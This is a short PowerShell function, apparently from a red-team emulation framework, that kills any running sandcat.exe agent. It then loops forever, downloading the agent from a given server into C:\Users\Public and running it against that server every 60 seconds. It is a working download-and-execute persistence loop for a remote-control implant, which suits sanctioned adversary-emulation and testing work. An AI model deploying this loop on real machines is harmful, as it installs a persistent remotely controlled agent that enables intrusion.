function update
{
    Param(
        [Parameter(Mandatory=$true)][String]$server
    )
    $OldPids = Gwmi Win32_Process -Filter "Name='sandcat.exe'" | Select -Property ParentProcessId,ProcessId
    if ($OldPids)
    {
        echo "[*] sandcat.exe is running"
        ForEach-Object -InputObject $OldPids -Process { try { Stop-Process $_.ProcessId; Stop-Process $_.ParentProcessId } catch { "[!] could not kill sandcat.exe" }}
    }
    else
    {
        echo "[!] sandcat.exe is not running"
    }
    $SandcatPath = "C:\Users\Public\sandcat.exe"
    while($true)
    {
        if(!(Test-Path $SandcatPath))
        {
            $url="$server/file/download"
            $wc=New-Object System.Net.WebClient
            $wc.Headers.add("file","sandcat.go")
            $wc.Headers.add("platform","windows")
            $output="C:\Users\Public\sandcat.exe"
            $wc.DownloadFile($url,$output)
        }
        C:\Users\Public\sandcat.exe -server $server -group diy_eval
        sleep -Seconds 60
    }
}